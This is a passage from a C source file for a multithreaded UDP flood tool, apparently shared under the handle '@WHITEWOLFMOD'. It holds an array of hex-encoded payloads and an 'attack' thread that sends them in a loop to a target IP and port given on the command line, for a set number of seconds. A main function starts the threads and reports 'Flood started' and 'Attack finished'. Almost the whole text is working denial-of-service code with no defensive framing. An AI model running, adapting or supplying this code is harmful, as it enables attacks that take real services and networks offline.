 "\x77\x69\x6C\xCB\xF8\x8F\xC2\x4F\x63\xBB\x42\xE1\x4A\x38\x68\xE2\xF8\x48\xE8\x47\x82\xFD\x07\xCF\x3D\xE8\x83\xCD\x98\x25\xAC\x20\xB8\x18\x29\x40\xD5\xE7\x13\x95\x5E\xE0\x6F\xBD\x8B\xE9\x5B\x8C\x0F\x9F\x3E\xAC\xFB\x4A\xCB\x58\x50\x8A\x82\xCA\xC8\x37\x86\x45\x5F\x84\xa6\xa4\xbA\r\nBA\r\n15\r\n54\r\nAC\r\nA9\r\n87\r\nA1\r\n9E\r\n4F\r\n31\r\nA9\r\n1A\r\n53\r\n1D\r\nCD\r\n24\r\n27\r\n9D\r\nE2\r\n08",
 "\x77\x69\x6C\xCB\xF8\x8F\xC2\x4F\x63\xBB\x42\xE1\x4A\x38\x68\xE2\xF8\x48\xE8\x47\x82\xFD\x07\xCF\x3D\xE8\x83\xCD\x98\x25\xAC\x20\xB8\x18\x29\x40\xD5\xE7\x13\x95\x5E\xE0\x6F\xBD\x8B\xE9\x5B\x8C\x0F\x9F\x3E\xAC\xFB\x4A\xCB\x58\x50\x8A\x82\xCA\xC8\x37\x86\x45\x5F\x84\xa6\xa4\xbA\r\nBA\r\n15\r\n54\r\nAC\r\nA9\r\n87\r\nA1\r\n9E\r\n4F\r\n31\r\nA9\r\n1A\r\n53\r\n1D\r\nCD\r\n24\r\n27\r\n9D\r\nE2\r\n08",
 "\x77\x69\x6C\xCB\xF8\x8F\xC2\x4F\x63\xBB\x42\xE1\x4A\x38\x68\xE2\xF8\x48\xE8\x47\x82\xFD\x07\xCF\x3D\xE8\x83\xCD\x98\x25\xAC\x20\xB8\x18\x29\x40\xD5\xE7\x13\x95\x5E\xE0\x6F\xBD\x8B\xE9\x5B\x8C\x0F\x9F\x3E\xAC\xFB\x4A\xCB\x58\x50\x8A\x82\xCA\xC8\x37\x86\x45\x5F\x84\xa6\xa4\xbA\r\nBA\r\n15\r\n54\r\nAC\r\nA9\r\n87\r\nA1\r\n9E\r\n4F\r\n31\r\nA9\r\n1A\r\n53\r\n1D\r\nCD\r\n24\r\n27\r\n9D\r\nE2\r\n08",
 "\x0B\x21\xCD\x8F\xBC\x50\x52\x68\x15\x39\xEA\xCD\x87\x02\xE3\xD3\x70\xA7\x24\xC7\x96\x4A\xDC\x0B\xC8\x6D\x56\xD3\xAC\x15\x1F\x3C\xFD\x20\x9B\x54\x71\xC2\x21\xD0\xFF\x76\x5F\x4E\xE2\x2D\x39\x70\x3B\xA2\xE9\x9F\x82\x9E\x8B\x45\x28\xE0\x2B\x7D\xBD\x73\x98\x02\x6F\xC2\x97\x05\xCD\x21\x7B\x6A\x1F\xFD\xE3\x08\xEC\x0A\xBD\x63\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7",
 "\x0B\x21\xCD\x8F\xBC\x50\x52\x68\x15\x39\xEA\xCD\x87\x02\xE3\xD3\x70\xA7\x24\xC7\x96\x4A\xDC\x0B\xC8\x6D\x56\xD3\xAC\x15\x1F\x3C\xFD\x20\x9B\x54\x71\xC2\x21\xD0\xFF\x76\x5F\x4E\xE2\x2D\x39\x70\x3B\xA2\xE9\x9F\x82\x9E\x8B\x45\x28\xE0\x2B\x7D\xBD\x73\x98\x02\x6F\xC2\x97\x05\xCD\x21\x7B\x6A\x1F\xFD\xE3\x08\xEC\x0A\xBD\x63\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7",
 "\x0B\x21\xCD\x8F\xBC\x50\x52\x68\x15\x39\xEA\xCD\x87\x02\xE3\xD3\x70\xA7\x24\xC7\x96\x4A\xDC\x0B\xC8\x6D\x56\xD3\xAC\x15\x1F\x3C\xFD\x20\x9B\x54\x71\xC2\x21\xD0\xFF\x76\x5F\x4E\xE2\x2D\x39\x70\x3B\xA2\xE9\x9F\x82\x9E\x8B\x45\x28\xE0\x2B\x7D\xBD\x73\x98\x02\x6F\xC2\x97\x05\xCD\x21\x7B\x6A\x1F\xFD\xE3\x08\xEC\x0A\xBD\x63\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7",
 "\x0B\x21\xCD\x8F\xBC\x50\x52\x68\x15\x39\xEA\xCD\x87\x02\xE3\xD3\x70\xA7\x24\xC7\x96\x4A\xDC\x0B\xC8\x6D\x56\xD3\xAC\x15\x1F\x3C\xFD\x20\x9B\x54\x71\xC2\x21\xD0\xFF\x76\x5F\x4E\xE2\x2D\x39\x70\x3B\xA2\xE9\x9F\x82\x9E\x8B\x45\x28\xE0\x2B\x7D\xBD\x73\x98\x02\x6F\xC2\x97\x05\xCD\x21\x7B\x6A\x1F\xFD\xE3\x08\xEC\x0A\xBD\x63\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7\xf7",   
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
/*
@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD
*/